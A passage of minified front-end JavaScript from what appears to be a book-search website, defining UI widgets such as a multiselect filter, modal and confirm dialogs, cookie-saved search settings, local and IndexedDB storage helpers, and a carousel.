n=i.find('[name="'+t+'"]');0!==n.length&&("checkbox"===n.attr("type")||"radio"===i.attr("type")?n.prop("checked",e):n.val(e))})),t.afterRender&&"function"==typeof t.afterRender&&setTimeout((()=>{e.css("padding","0"),t.top||e.find(".modal-dialog").css("top","auto"),t.afterRender()}),150),t.formAction&&i.find("form").attr("action",t.formAction),t.autoFocus&&e.find("input, textarea").first()&&setTimeout((function(){e.find("input, textarea").first().focus()}),500),setTimeout((()=>e.trigger("shown")),505)})).catch((t=>{r.stop(),e.find(".modal-dialog").css("height","auto"),n.removeClass("hidden"),n.find(".modal-title").html(i18next.t("Something went wrong")),e.modal("show"),i.html('<div class="modal-error">'+t.message+"</div>")})),this},this.hide=function(){return e.modal("hide"),this},this.title=function(e){return t.title=e,this},this.formAction=function(e){return t.formAction=e,this},this.formClear=function(){return $.each(i.find("input,select,textarea"),(function(){$el=$(this),"checkbox"==$el.attr("type")?$el.prop("checked",!1):"radio"==$el.attr("type")||$el.val("")})),this},this.formData=function(e){return t.formData=e,this},this.templateData=function(e){return t.templateData=e,this}},StorybookModelList=function(t=[],e="id"){let n={};function i(e){const i=n[e];return t[i]?t[i]:null}function r(){n={},$.each(t,(function(t,i){n[i[e]]=t}))}function o(s,a){a instanceof Array?$.each(a,(function(t,e){o(s,e)})):i(a[e])?t[n[a[e]]]=a:(s.call(t,a),r())}return r(),{get:i,getAll:function(){return t},push:function(t){o(Array.prototype.push,t)},unshift:function(t){o(Array.prototype.unshift,t)},remove:function(e){t.splice(n[e],1),r()},clear:function(){n={},t=[]}}},StorybookSearch={scope:"zlib-search",expires:2592e6,settingWraps:[],instStorybookMultiselect:null,switchView:function(t){t=t||"",setCookie(StorybookSearch.scope+"View",t,StorybookSearch.makeExpires(t)),document.location.reload()},makeExpires:function(t){return t?StorybookSearch.expires:-1},saveSearchSettings:function(){if($("#advSearch .multiselect-input_err").length)return(new StorybookNotify).error(i18next.t("Incorrect filters")),!1;const t=JSON.stringify(StorybookSearch.getSettings());setCookie(StorybookSearch.scope+"Settings",t,StorybookSearch.makeExpires(t)),StorybookSearch.toggleIcons()},clearFilters:function(){StorybookSearch.blockToggleIcons=!0;for(const t of StorybookSearch.settingWraps){"INPUT"===t.$wrap.get(0).nodeName?t.$wrap.prop("checked",!1):($("option",t.$wrap).each(((t,e)=>{$(e).attr("selected",!1)})),t.$wrap.val(""),t.$wrap.change()),t.$wrap.closest(".multiselect-box-wrap").find(".multiselect-input").removeClass("multiselect-input_err")}StorybookSearch.blockToggleIcons=!1,StorybookSearch.saveSearchSettings(),StorybookSearch.toggleIcons()},getSettings:function(){let t={length:0};for(const e of StorybookSearch.settingWraps){const n="INPUT"===e.$wrap.get(0).nodeName,i="multiple"!=e.$wrap.attr("multiple");let r=null,o=[];if(n)e.$wrap.prop("checked")&&(r=e.$wrap.val());else{i?$("option",e.$wrap).each(((t,n)=>{if($(n).attr("selected"))return r=e.$wrap.val(),!1})):($("option",e.$wrap).each(((t,e)=>{$(e).attr("selected")&&o.push($(e).val())})),o.length&&(r=o));const n=[];$('optgroup[label*="actions"] > option',e.$wrap).each(((e,i)=>{$(i).attr("selected")&&(n.push($(i).val()),o.splice($(i).val(),1)),n.length&&(t.actions=t.actions?t.actions.concat(n):n)}))}r&&(t[e.name]=r,++t.length)}return t},getSettingsFromCook:function(){let t=getCookie(StorybookSearch.scope+"Settings"),e={length:0};if(t)try{e=JSON.parse(t)}catch(t){console.log(t)}return e},isSearchSettings:function(){return StorybookSearch.getSettings().length>0},isSearchSettingsInCooke:function(){return StorybookSearch.getSettingsFromCook().length>0},isDiffSettings:function(){const t=StorybookSearch.getSettings(),e=StorybookSearch.getSettingsFromCook();if(t.length!==e.length)return!0;delete e.length;for(const n in e){if(!t[n])return!0;if(Array.isArray(e[n])){if(e[n].length!==t[n].length)return!0;for(const i of e[n]){let e=!0;for(const r of t[n])i===r&&(e=!1);if(e)return!0}}else if(e[n]!==t[n])return!0}return!1},toggleIcons:()=>{if(StorybookSearch.blockToggleIcons)return!1;const t=$(".clear-search-settings"),e=$(".saving-search-settings"),n=$(".svg__body",e),i=$(".svg__body-check-mark",e);$(".svg__border",e);StorybookSearch.isSearchSettings()||StorybookSearch.isSearchSettingsInCooke()?StorybookSearch.isDiffSettings()?(e.removeClass("saving-search-settings__blocked hidden").attr("title",e.data("title_save")),n.addClass("svg_active"),i.hide(),t.removeClass("hidden")):(e.removeClass("hidden").addClass("saving-search-settings__blocked").attr("title",e.data("title_saved")),n.removeClass("svg_active"),i.show(),t.removeClass("hidden")):(e.addClass("hidden"),t.addClass("hidden"))},initWraps:function(){const t="."+StorybookSearch.instStorybookMultiselect.getGeneralWrapClass(),e="."+StorybookSearch.instStorybookMultiselect.getTargetSelectClass(),n=[{name:"e",$wrap:$('input[name="e"]')},{name:"yearFrom",$wrap:$("#wrapYearFrom").closest(t).find(e)},{name:"yearTo",$wrap:$("#wrapYearTo").closest(t).find(e)},{name:"languages",$wrap:$("#wrapLang").closest(t).find(e)},{name:"extensions",$wrap:$("#wrapExt").closest(t).find(e)}];for(const t of n)t.$wrap.length&&StorybookSearch.settingWraps.push(t)},init:function(){$((function(){StorybookSearch.instStorybookMultiselect=StorybookMultiselect({onlyStaticBehavior:!0}),StorybookSearch.initWraps(),StorybookSearch.toggleIcons();const t="."+StorybookSearch.instStorybookMultiselect.getTargetSelectClass();$('input[name="e"], '+t).on("change",(function(){let t=$("#searchFieldx").val();$(this).is(":checked")?t='"'+t+'"':'"'==t.slice(0,1)&&'"'==t.slice(-1)&&(t=t.slice(1),t=t.slice(0,-1)),$("#searchFieldx").val(t),StorybookSearch.toggleIcons()})),$("#searchFieldx").on("change input",(function(){let e=$("#searchFieldx").val();'"'==e.slice(0,1)&&'"'==e.slice(-1)?$('input[name="e"], '+t).prop("checked",!0):$('input[name="e"], '+t).prop("checked",!1),StorybookSearch.toggleIcons()}))}))}},StorybookMultiselect=function(t={}){const e={targetSelector:".multiselect",targetGroupSelector:"optgroup",targetItemSelector:"option",useTargetSelect:!1,height:null,type:"singleton",multipleCaptionsMode:"quantity",switchType:"checkbox",enableFilter:!0,highlightMatches:!1,enableSort:!0,sortField:"text",sortType:"text",isReversSort:!1,valuesName:"multiselect_values",placeholder:i18next.t("select"),placeholderFull:i18next.t("selected"),enableNone:!0,textForNone:i18next.t("None"),delimiter:'<div class="multiselect-delimiter"></div>',enableSelectedGroup:!0,hideEmptyGroups:!0,showGroupTitle:!1,onlyStaticBehavior:!1,disabled:!1,pinnedUnknownValue:!1,aliasData:{sources:["text"]},actions:null,enableFooter:!1,footerTemplate:'<div class="multiselect-controls"><span class="multiselect-clear-control" z-role="clear">'+i18next.t("Clear")+'</span><input type="submit" class="multiselect-submit-control z-btn z-btn-secondary z-btn-narrow" disabled z-role="submit" value="'+i18next.t("Apply")+'"></div>'},n={targetSelectClass:"multiselect__target-select",generalWrapClass:"multiselect-box-wrap"},i={};let r={},o={},s="",a=[],l={},c=!1,u=!1;function d(t={}){Object.assign(e,t),n.isMultiple="multiple"===e.type,e.enableSelectedGroup=n.isMultiple&&e.enableSelectedGroup,n.$target=e.targetSelector&&$(e.targetSelector).length?$(e.targetSelector):null,n.$wrap=e.wrapSelector&&$(e.wrapSelector).length?$(e.wrapSelector):null;const c=$("<div>").addClass(n.generalWrapClass);if(n.$target)n.$target.before(c),c.append(n.$target);else{if(!n.$wrap)return console.error('No target element defined to use "Storybook-multiselect"'),!1;n.$wrap.before(c)}n.$wrap=n.$wrap||$("<div>").addClass("multiselect-wrap"),c.append(n.$wrap),e.delimiter&&"object"==typeof e.delimiter&&$(e.delimiter).length&&(e.delimiter=$(e.delimiter).html()),e.rowData?(f(e.rowData),delete e.rowData,e.useTargetSelect&&function(){const t=$("<select>");n.isMultiple&&t.attr("multiple","multiple");const e=function(t){let e="";const n={};for(const i of o.getAll())i.groupName===t.name&&(e+=`<option value="${i.value}" selected>${i.text}</option>`,n[i.value]=!0);for(const i of t.items)n[i.value]||(e+=`<option value="${i.value}">${i.text}</option>`);return"items"!==t.name&&(e=`<optgroup label="${t.name}">${e}</optgroup>`),e};for(const n of r.getAll())"selected"!==n.name&&t.append(e(n));n.$wrap.before(t),n.$target=t}()):n.$target&&(n.$target.attr("name")&&(e.valuesName=n.$target.attr("name")),f(b())),s=o?h():[],e.actions&&function(t,i){const o=e.wrapSelector+"__actions",s=t.filter((t=>!t.selected)).map((t=>({text:t.text,value:t.value})));r.unshift({name:o,items:s});const c=t.filter((t=>t.selected)).map((t=>({text:t.text,value:t.value,groupName:o,id:o+"__"+t.value})));if(l=new StorybookModelList(c,"id"),r.unshift({name:o+"__selected",items:c}),a=a.concat(c.map((t=>t.value))),i){let e="";for(const n of t){const t=n.selected?" selected":"";e+=`<option value="${n.value}"${t}>${n.text}</option>`}e=`<optgroup label="${o}">${e}</optgroup>`,n.$target.prepend(e)}}(e.actions,e.useTargetSelect),e.useTargetSelect&&n.$target?(n.$target.removeAttr("name").addClass(n.targetSelectClass).hide(),n.isMultiple?n.$target.attr("multiple",!0):n.$target.removeAttr("multiple")):(n.$target&&(n.$target.remove(),n.$target=null),e.useTargetSelect=null),e.handlers&&(e.handlers.onChange&&"function"==typeof e.handlers.onChange&&(i.onChange=e.handlers.onChange),delete e.handlers)}function h(){return JSON.stringify(o.getAll().map((t=>t.id)))}function f(t){let n=[],i=[];const s=function(t,e){Array.isArray(t)||(t=[t]);for(const n of t)n.id=T(n.value,e),n.groupName=e,i.push(n)};if(t){if(t.groups)for(const e of t.groups)e.name&&(e.selected&&(s(e.selected,e.name),delete e.selected),e.items=e.items||[],n.push(e));(t.items||t.selected)&&(n.push({name:"items",items:t.items||[]}),s(t.selected||[],"items"));for(const t of n)w(t.items);i=w(i),e.enableSelectedGroup&&n.unshift({name:"selected",items:i})}r=new StorybookModelList(n,"name"),o=new StorybookModelList(JSON.parse(JSON.stringify(i)),"id")}function p(t){return e.actions.find((e=>e.value===t))}function g({select:t=[],disable:e=[]}){return"all"===t||"all"===e?"all":t.concat(e)}function m(t){Array.isArray(t)||(t=[t]);const i=[],r=`multiselect-item__switch_${e.switchType}_checked`;for(const n of a){const r=g(e.actions.find((t=>t.value===n)));for(const e of t)if("all"===r||"all"===e||r.includes(e)){i.push(n);break}}for(const t of i){const i=$(`.multiselect-item[data-value="${t}"]`,n.$wrap).parents(".multiselect-item-wrap"),o=$(".multiselect-item__switch",i),s=T(t,e.wrapSelector+"__actions__selected");l.remove(s),i.removeClass("multiselect-item_selected"),o.removeClass(r),a.splice(t,1),e.actions.find((e=>e.value===t)).isLocking&&v(!1)}}function v(t=!0,e="locked"){c=t;const i=$('.multiselect-group-wrap:not([data-name*="actions"])>.multiselect-item-list',n.$wrap);t?(i.addClass("multiselect-item-list--locked"),I(e)):(i.removeClass("multiselect-item-list--locked"),I())}function y(){const t=$('.multiselect-group-wrap[data-name$="selected"]',n.$wrap);if(!t.length)return!1;const i={},s={},a={};if(0!==Object.keys(l).length)for(const t of l.getAll())i[t.groupName]=i[t.groupName]||{},i[t.groupName][t.value]=!0;for(const t of o.getAll())s[t.groupName]=s[t.groupName]||{},s[t.groupName][t.value]=!0;$(".multiselect-item",t).each(((t,e)=>{const n=$(e),i=n.data("group"),r=n.data("value");o.get(T(r,i))||0!==Object.keys(l).length&&l.get(T(r,i))||(a[i]=a[i]||[],a[i].push({id:T(r,i),value:r,text:O(n)}))}));for(const t in Object.assign({},s,i)){const e=r.get(t),n=s[t]||i[t];for(const t in e.items){n[e.items[t].value]&&(e.items[t].delete=!0)}const o=[];for(const t of e.items)t.delete||o.push(t);e.items=w(o),r.push(e)}for(const t in a){const e=r.get(t);for(const n of a[t])e.items.push(n);e.items=w(e.items),r.push(e)}const c=r.get("selected");if(c.items=w([...o.getAll()]),r.push(c),0!==Object.keys(l).length){const t=r.get(e.wrapSelector+"__actions__selected");t.items=w([...l.getAll()]),r.push(t)}u=!1}function b(){const t=[],e=function(t,e=!1){const i=[],r=[];return $("option",t).each((function(t,o){if(e&&$(o).closest("optgroup").length)return;const s={text:$(o).text(),value:$(o).val()},a=o.hasAttribute("selected");a&&r.push(s),a&&n.isMultiple||i.push(s)})),{items:i,selected:r}};$("optgroup",n.$target).length&&$("optgroup",n.$target).each((function(n,i){const r=e($(i));t.push({name:$(i).attr("label"),items:r.items,selected:r.selected})}));const i=e(n.$target,!0);return{groups:t,items:i.items,selected:i.selected}}function w(t){if(e.enableSort){const n=e.sortField;"text"===e.sortType?e.isReversSort?t.sort(((t,e)=>t[n]<e[n]?1:t[n]>e[n]?-1:0)):t.sort(((t,e)=>t[n]>e[n]?1:t[n]<e[n]?-1:0)):"number"===e.sortType&&(e.isReversSort?t.sort(((t,e)=>e[n]-t[n])):t.sort(((t,e)=>t[n]-e[n])))}return t}function k(){if(!n.$wrap)return console.log("Not initialize container for plugin!"),!1;n.$target&&n.$target.hide(),n.$wrap.html(function(t){let n=L();let i=`<div class="multiselect-input-wrap">\n                        <input ${e.disabled?' disabled="disabled" ':""} type="text" style="text-overflow: ellipsis" class="multiselect-input" placeholder="${n}">\n                        <span class="multiselect-toggle">\n                            <svg width="8" height="5" viewBox="0 0 8 5" fill="none" xmlns="http://www.w3.org/2000/svg">\n                                <path d="M4 4.66666L0 0.666664H8L4 4.66666Z" fill="#8C8C8C"/>\n                            </svg>\n                        </span>\n                    </div>\n                    <div class="multiselect-values" style="display: none;"></div>\n                    <div class="multiselect-group-list-wrap" style="display:none;">\n                        <div class="multiselect-group-list-wrap__patch"></div>\n                        <div class="multiselect-group-list">`;t&&(i+=_(t));i+="</div>",e.enableFooter&&(i+='<div class="multiselect-footer">'+e.footerTemplate+"</div>");return i+="</div>",i}()),$('[z-role="submit"]',n.$wrap).prop("disabled",h()===s)}function x(t){$(".multiselect-group-list",n.$wrap).html(_(t))}function _(t){const n=0===o.getAll().length?"multiselect-item_selected":"";let i="";e.enableNone&&(i+=`<div class="multiselect-item_none ${n}" data-text_row="${e.textForNone}">`+e.textForNone+"</div>");let r=!1;e.delimiter&&(i+=e.delimiter);for(const e in t){const n=t[e];i+=S(n,t.length-1==+e),n.items.length&&(r=!0)}return r||(i='<div class="multiselect-group-list__empty-box">'+i18next.t("Not found")+"</div>"),i}function S(t,n=!1){const i=t.items.length?"":'style="display:none;"';let r=`<div class="multiselect-group-wrap" data-name="${t.name}" ${i}>`;e.showGroupTitle&&"items"!==t.name&&(r+=`<div class="multiselect-group-name"> ${t.name}</div>`),c&&t.name!==e.wrapSelector+"__actions__selected"?r+='<div class="multiselect-item-list multiselect-item-list--locked">':r+='<div class="multiselect-item-list">';for(const e of t.items)r+=C(e,t.name);return r+="</div>",e.delimiter&&!n&&(r+=e.delimiter),r+="</div>",r}function C(t,i){const r=i.includes("selected")||!!o.get(T(t.value,i))||0!==Object.keys(l).length&&!!l.get(T(t.value,i)),s=r?"multiselect-item_selected":"",a=t.groupName||i,c=t.textRow?`data-text="${t.textRow}"`:"";let u="";if(n.isMultiple){const t=r?`multiselect-item__switch_${e.switchType}_checked`:"";u+=`<span class="multiselect-item__switch multiselect-item__switch_${e.switchType} ${t}"></span>`}return u+=`<span class="multiselect-item" data-value="${t.value}" data-group="${a}" ${c}>`+t.text+"</span>",`<div class="multiselect-item-wrap ${s}">${u}</div>`}function E(){const t=function(t){u&&y();x(function(t){const n=[],i=JSON.parse(JSON.stringify(r.getAll()));t=t.toLowerCase();for(const r of i){const i={name:r.name,items:[]};for(const n of r.items){n.textRow=n.text,n.text=String(n.text);const r=n.text.toLowerCase().indexOf(t);if(e.pinnedUnknownValue&&"unknown"==n.value)i.items.push(n);else if(r+1){if(e.highlightMatches){const e=n.text.substr(0,r),i=n.text.substr(r,t.length),o=n.text.substr(r+t.length);n.text=`${e}<span class="multiselect-item__highlight-matches">`+i+`</span>${o}`}i.items.push(n)}}n.push(i)}return n}(t.target.value)),$(".multiselect-group-list__empty-box",n.$wrap).length?$(".multiselect-input",n.$wrap).addClass("multiselect-input_err"):$(".multiselect-input",n.$wrap).removeClass("multiselect-input_err")},i=function(){$(".multiselect-group-list-wrap").hide(),$(".multiselect-input").val("")};1===$(".multiselect-box-wrap").length&&$("body").on("click",(function(t){0===$(t.target).closest(".multiselect-box-wrap").length&&i()})),n.$wrap.on("click",".multiselect-toggle",(function(){if($(this).siblings(".multiselect-input").is(":disabled"))return;const t=$(".multiselect-group-list-wrap",n.$wrap);if(t.is(":hidden")){if(i(),u&&y(),x(r.getAll()),t.show(),e.enableFooter){const t=n.$wrap.find(".multiselect-group-list").height();n.$wrap.find(".multiselect-footer").css("top",t+1+"px")}}else t.hide(),"enum"!==e.multipleCaptionsMode&&I()})),n.$wrap.on("focus, click",".multiselect-input",(function(){$(".multiselect-group-list-wrap",n.$wrap).is(":hidden")&&$(".multiselect-toggle",n.$wrap).click()}));const d=function(t){if(o.clear(),e.actions&&l.clear(),t)$(".multiselect-toggle",n.$wrap).click();else{const t=`multiselect-item__switch_${e.switchType}_checked`;for(let e of $(".multiselect-item-wrap",n.$wrap)){const n=$(".multiselect-item__switch",e);$(e).removeClass("multiselect-item_selected"),n.removeClass(t)}}$(".multiselect-input-wrap input",n.$wrap).removeClass("multiselect-input_err"),I($(this).data("text_row")),A(),P(),e.enableSelectedGroup&&(u=!0)};if(n.$wrap.on("click",".multiselect-item_none",d.bind(this,!0)),n.$wrap.on("click",'[z-role="clear"]',(()=>{d(!1),n.$wrap.closest("form").submit()})),n.$wrap.on("click",".multiselect-item-wrap",(function(){const t=$(this),i=$(".multiselect-item",t),r=O(i);if($(".multiselect-input",n.$wrap).removeClass("multiselect-input_err"),$(".multiselect-item_none",n.$wrap).removeClass("multiselect-item_selected"),e.enableSelectedGroup&&(u=!0),t.parents(".multiselect-group-wrap").data("name").includes(e.wrapSelector+"__actions")){const r=i.data("value");t.hasClass("multiselect-item_selected")?(!function(t,{isLocking:i=!1,select:r=[]}){let s=$('.multiselect-group-wrap:not([data-name*="actions"]) .multiselect-item-wrap',n.$wrap);const a=`multiselect-item__switch_${e.switchType}_checked`,c=o.getAll();m(g({select:r}));for(let t of s){t=$(t);const e=$(".multiselect-item",t);("all"===r||r.includes(e.data("value")))&&c.find((t=>t.value===e.data("value")))&&($(".multiselect-item__switch",t).removeClass(a),o.remove(T(e.data("value"),e.data("group"))),t.removeClass("multiselect-item_selected"))}const u=$(".multiselect-item",t),d=$(".multiselect-item__switch",t),h=T(u.data("value"),u.data("group"));l.remove(h),t.removeClass("multiselect-item_selected"),d.removeClass(a),i?v(!1):I(),A(),P(),N()}(t,p(r)),a.splice(r,1)):(!function(t,{isLocking:i=!1,select:r=[],disable:s=[]}){let a=$('.multiselect-group-wrap:not([data-name$="actions"]) .multiselect-item-wrap',n.$wrap);const c=`multiselect-item__switch_${e.switchType}_checked`,u=o.getAll();m(g({select:r,disable:s}));for(let t of a){t=$(t);const e=$(".multiselect-item",t);if("all"===r||r.includes(e.data("value"))){if(!u.find((t=>t.value===e.data("value")))){const n=$(".multiselect-item__switch",t);t.addClass("multiselect-item_selected"),n.addClass(c),o.push({id:T(e.data("value"),e.data("group")),value:e.data("value"),text:O(e),groupName:e.data("group")})}}else("all"===s||s.includes(e.data("value")))&&u.find((t=>t.value===e.data("value")))&&($(".multiselect-item__switch",t).removeClass(c),o.remove(T(e.data("value"),e.data("group"))),t.removeClass("multiselect-item_selected"))}const d=$(".multiselect-item",t),h=$(".multiselect-item__switch",t),f=T(d.data("value"),d.data("group")),p=O(d);t.addClass("multiselect-item_selected"),h.addClass(c),l.push({id:f,value:d.data("value"),text:p,groupName:d.data("group")}),i?v(!0,p):I(),A(),P(),N()}(t,p(r)),a.push(r))}else{if(a.length&&m(i.data("value")),n.isMultiple){const n=$(".multiselect-item__switch",t),s=`multiselect-item__switch_${e.switchType}_checked`;t.hasClass("multiselect-item_selected")?(o.remove(T(i.data("value"),i.data("group"))),t.removeClass("multiselect-item_selected"),n.removeClass(s)):(t.addClass("multiselect-item_selected"),n.addClass(s),o.push({id:T(i.data("value"),i.data("group")),value:i.data("value"),text:r,groupName:i.data("group")})),I()}else $(".multiselect-group-list input",n.$wrap).prop("checked",!1),$(".multiselect-item-wrap",n.$wrap).removeClass("multiselect-item_selected"),t.addClass("multiselect-item_selected"),o.clear(),o.push({id:T(i.data("value"),i.data("group")),value:i.data("value"),text:r,groupName:i.data("group")}),$(".multiselect-toggle",n.$wrap).click();A(),P(),N()}})),e.enableFooter){const t=$('[z-role="submit"]',n.$wrap);t&&n.$wrap.on("click",'.multiselect-item-wrap, [z-role="clear"]',(()=>t.prop("disabled",h()===s)))}e.enableFilter&&n.$wrap.on({input:t,change:function(e){setTimeout(t,300,e)},paste:t},".multiselect-input"),e.useTargetSelect&&n.$target.on("change",(function(){if(n.insideChange)return!1;e.actions?(!function(){for(const t of a){$(`.multiselect-item[data-value="${t}"]`,n.$wrap).parents(".multiselect-item-wrap"),e.actions.find((e=>e.value===t));const i=T(t,e.wrapSelector+"__actions");l.remove(i)}a=[],c&&v(!1)}(),f(b()),r.unshift({name:e.wrapSelector+"__actions__selected",items:[]})):f(b()),I(),A(),$(".multiselect-group-list",n.$wrap).empty()}))}function T(t,e){return`${e}__${t}`}function L(){const t=o.getAll();let i=t.length;return i?n.isMultiple?"enum"===e.multipleCaptionsMode?function(){const t=o.getAll();return t.reduce(((t,n)=>{let i=function(t){for(const n of e.aliasData.sources){if("object"==typeof n&&n[t.value])return n[t.value];if("string"==typeof n&&t[n])return t[n]}if("string"==typeof e.aliasData.fallbackText&&e.aliasData.fallbackText.length)return e.aliasData.fallbackText;return"null"}(n);return e.aliasData.pipe&&(i=function(t){let n=t;for(const t of e.aliasData.pipe)switch(typeof t){case"object":n=t[0].call(n,...t.slice(1));break;case"function":n=t.call(n,n)}return n}(i)),t+", "+i}),"").substr(2)}():`${i} ${e.placeholderFull}`:t[0].text:e.placeholder}function O(t){return t.data("text")||t.html()}function I(t){t=t||L(),$(".multiselect-input",n.$wrap).attr("placeholder",t).data("value",t).val("")}function A(){const t=$(".multiselect-values",n.$wrap),r=e.valuesName+(n.isMultiple?"[]":"");t.empty();for(const e of o.getAll())t.append(`<input type="hidden" name="${r}" value="${e.value}">`);if(0!==Object.keys(l).length){const e="actions[]";for(const n of l.getAll())t.append(`<input type="hidden" name="${e}" value="${n.value}">`)}i.onChange&&i.onChange(o.getAll())}function P(){if(!e.useTargetSelect)return!1;n.$target.val(""),$("option",n.$target).each(((t,e)=>{const n=$(e).closest("optgroup"),i=n.length?n.attr("label"):"items",r=$(e).val(),s=!!o.get(T(r,i))||0!==Object.keys(l).length&&!!l.get(T(r,i));$(e).attr("selected",s)})),n.insideChange=!0,n.$target.change(),n.insideChange=!1}function N(){if(n.isMultiple||!e.relationWrapSelector)return;const t=o.getAll();if(1!==t.length)return;const i=$(e.relationWrapSelector),r=parseInt(t[0].value);if(!isNaN(r)&&r){const t=parseInt(i.find(".multiselect-values input").val());!isNaN(t)&&t&&("rangeStart"===e.relationType&&t<r||"rangeEnd"===e.relationType&&t>r?($(".multiselect-input",n.$wrap).addClass("multiselect-input_err"),o.clear(),A(),P()):$(".multiselect-input",n.$wrap).removeClass("multiselect-input_err"))}if($(".multiselect-input",i).hasClass("multiselect-input_err")){const t=$(".multiselect-input",i).data("value");i.find(".multiselect-item-wrap").each((function(){if($(this).find(".multiselect-item").data("value")==t)return $(this).trigger("click"),!1}))}}if(t.onlyStaticBehavior)return{getTargetSelectClass:function(){return n.targetSelectClass},getGeneralWrapClass:function(){return n.generalWrapClass}};d(t),k(),E(),A(),N(),e.actions&&function(){for(const t of a){const e=p(t);if(e.isLocking){c=!0,I(e.text);break}}}()},StorybookConfirm=function(t,e,n,i){"use strict";this.title=t,this.message=e,this.positiveBtnText=n||i18next.t("Yes"),this.negativeBtnText=i||i18next.t("Cancel"),this.confirmContent=$('\n        <div class="Storybook-confirm-overlay">\n            <div class="Storybook-confirm-container">\n                <div class="zc-title">'+this.title+'</div>\n                <div class="zc-message">'+this.message+'</div>\n                <div class="zc-buttons">\n                    <button class="zc-negative-btn primary">'+this.negativeBtnText+'</button>\n                    <button class="zc-positive-btn">'+this.positiveBtnText+"</button>\n                </div>\n            </div>\n        </div>\n    "),this.callback=!1,this.positiveCallback=function(){},this.negativeCallback=function(){},this.setPrimaryOnPositiveBtn=()=>(this.confirmContent.find(".zc-negative-btn").removeClass("primary"),this.confirmContent.find(".zc-positive-btn").addClass("primary"),this),this.setPrimaryOnNegativeBtn=()=>(this.confirmContent.find(".zc-positive-btn").removeClass("primary"),this.confirmContent.find(".zc-negative-btn").addClass("primary"),this),this.destroy=()=>{this.confirmContent.fadeOut(150,(()=>{this.confirmContent.remove()})),this.unbindKeyboardEvents()},this.bindKeyboardEvents=()=>{const t=this;$(document).on("keydown.StorybookConfirm",(function(){return!1})),$(document).on("keyup.StorybookConfirm",(function(e){switch(e.which){case 9:const e=t.confirmContent.find("button.primary"),n=e.next("button").length?e.next("button"):t.confirmContent.find(".zc-buttons button:first");e.removeClass("primary"),n.addClass("primary");break;case 13:t.confirmContent.find("button.primary").trigger("click");break;case 27:t.destroy()}}))},this.unbindKeyboardEvents=()=>{$(document).off("keydown.StorybookConfirm keyup.StorybookConfirm")},this.show=async function(){const t=this;if(!this.title.length||!this.message.length)return!1;this.bindKeyboardEvents();const e=new Promise(((e,n)=>{t.confirmContent.find(".zc-positive-btn").on("click",(()=>{t.destroy(),e(!0)})),t.confirmContent.find(".zc-negative-btn").on("click",(()=>{t.destroy(),e(!1)})),t.confirmContent.on("click",(n=>{$(n.target).hasClass("Storybook-confirm-overlay")&&(t.destroy(),e(!1))})),$("body").append(t.confirmContent.fadeIn(150))}));return t.callback&&e.then((e=>{e?t.positiveCallback():t.negativeCallback()})),e}};StorybookConfirm.prototype={positive:function(t){return this.positiveCallback=t,this.callback=!0,this},negative:function(t){return this.negativeCallback=t,this.callback=!0,this}};const StorybookIDB=function(){const t=parseInt(CurrentUser.id)||0;let e;const n={userSavedBooks:"++id,userId,bookId",userBooksInBooklists:"++id,userId,bookId,booklistId",values:"++id,userId,value,timestamp"};"object"==typeof window.StorybookIDBLink&&(e=window.StorybookIDBLink);this.dbLink=function(){return async function(){if(void 0!==e)return e;e=new Dexie("Storybook_db"),e.version(3).stores(n);try{await e.open()}catch(t){e=null}return window.StorybookIDBLink=e,e}()},this.isSupported=async function(){return null!==await this.dbLink()},this.table=async function(t){return!1===await this.isSupported()?null:e[t]?e[t]:(console.log("Table does not exist: "+t),null)},this.isValueExpired=async function(e,n){const i=await this.table("values");if(!n||!i)return!0;const r=Math.floor(Date.now()/1e3),o=await i.where({userId:t,value:e}).first();return!o||r>o.timestamp+n},this.putValue=async function(e){if(!this.table("values"))return;const n=Math.floor(Date.now()/1e3),i=await this.table("values");let r=await i.where({userId:t,value:e}).first();r?r.timestamp=n:r={userId:t,value:e,timestamp:n},await i.put(r)}},StorybookLocalStorage=function(){const t=parseInt(CurrentUser.id)||0,e="UserId",n=function(){return window.localStorage?window.localStorage:null},i=function(i){return t!==parseInt(n().getItem(i+e))};this.isSupported=function(){return null!==n()},this.getByCurrentUser=function(t,e=!0){if(!this.isSupported())return!1;if(i(t))return null;if(e)try{return JSON.parse(n().getItem(t))}catch(t){return null}return n().getItem(t)},this.putByCurrentUser=function(i,r){if(!this.isSupported())return!1;if("object"==typeof r)try{r=JSON.stringify(r)}catch(t){return!1}return n().setItem(i+e,t),n().setItem(i,r),!0},this.isValueExpired=function(t,e){if(!this.isSupported())return null;if(i(t)||!e)return!0;const r=parseInt(n().getItem(t))+e;return Math.floor(Date.now()/1e3)>r}},StorybookCarousel=function(t){const e=$(t),n=function(t){t.tooltip("hide")};$("body").click((function(t){$(t.target).hasClass("carousel-right")||n($(".carousel-right"))})),e.flickity({cellAlign:"left",contain:!0,pageDots:!1,prevNextButtons:!1,groupCells:1,lazyLoad:!0,on:{ready:function(){$(this.element).removeClass("carousel-loading")}}}).on("change.flickity",(function(t,e){const i=$(this).parents(".Storybook-carousel"),r=$(this).parents(".Storybook-carousel").find(".carousel-container"),o=$(this).data("flickity"),s=i.find(".carousel-left"),a=i.find(".carousel-right"),l=function(t){const e=t.find(".carousel-cell"),n=(e.length,e.outerWidth(!0),t.width()),i=e.first().outerWidth(!0);return Math.floor(n/i)}(i),c=Math.ceil(o.cells.length/l);var u;o.options.groupCells=l,o.options.groupCells=o.options.groupCells+1,o.reloadCells(),r.flickity("lazyLoad"),o.options.groupCells=o.options.groupCells-1,o.reloadCells(),l<o.cells.length&&i.find(".carousel-buttons").removeClass("hidden"),null==o.selectedIndex||0==o.selectedIndex?s.addClass("disabled"):s.removeClass("disabled"),o.selectedIndex>0&&o.selectedIndex+1>c-1?(a.addClass("disabled"),u=a,window.screen.width<=768||u.tooltip({title:u.data("tooltip-text"),placement:u.parent().hasClass("carousel-buttons-inside")?"right":"bottom",trigger:"manual",html:!0}).tooltip("show")):(a.removeClass("disabled"),n(a))})).trigger("change.flickity"),$(".carousel-left").on("click",(function(t){const e=$(this).parents(".Storybook-carousel").find(".carousel-container");$(this).hasClass("disabled")||e.flickity("previous")})),$(".carousel-right").on("click",(function(t){const e=$(this).parents(".Storybook-carousel").find(".carousel-container");e.data("flickity");e.flickity(),$(this).hasClass("disabled")||e.flickity("next")}))};class StorybookTooltip{constructor(t){let e=document.createElement("div");e.id=t.id?t.id:"tooltip-"+Math.round(999999*Math.random()),e.className="zlib-tooltip",e.innerHTML=null!==t.html&&void 0!==t.html?t.html:"!",e.setAttribute("style","display:none"),null!==t.parent&&void 0!==t.parent?this.parent="string"==typeof 